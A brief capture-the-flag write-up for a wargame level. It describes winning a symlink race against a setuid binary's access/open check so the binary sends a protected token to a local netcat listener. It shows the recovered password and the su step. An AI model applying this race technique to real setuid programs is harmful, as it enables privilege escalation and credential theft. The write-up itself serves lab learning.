# Flag 10

```bash
$ ll
total 28
dr-xr-x---+ 1 level10 level10   140 Mar  6  2016 ./
d--x--x--x  1 root    users     340 Aug 30  2015 ../
-r-x------  1 level10 level10   220 Apr  3  2012 .bash_logout*
-r-x------  1 level10 level10  3518 Aug 30  2015 .bashrc*
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10*
-r-x------  1 level10 level10   675 Apr  3  2012 .profile*
-rw-------  1 flag10  flag10     26 Mar  5  2016 token
```

We see we have an exe named level10, so run it:
```bash
$ ./level10 file host
```

But we need to open a server on port 6969 to listen for file content.

```bash
$ nc -lk 6969
$ ./level10 token localhost
You don't have access to token
```

So we need to find a way to have access to token. When we dissassemble level10 exe, we see that the call of access and open of file is not direct. So we can do a symbolic link and hope we have the correct timing to switch file pointed by symbolic link at correct timing, and we have a small script to do this


```bash
$ chmod +x script.sh
$ ./script.sh
```

Inside the terminal where we run nc we get:
woupa2yuojeeaaed06riuj63c (flag10 password)

```bash
$ su flag10
$ getflag
```
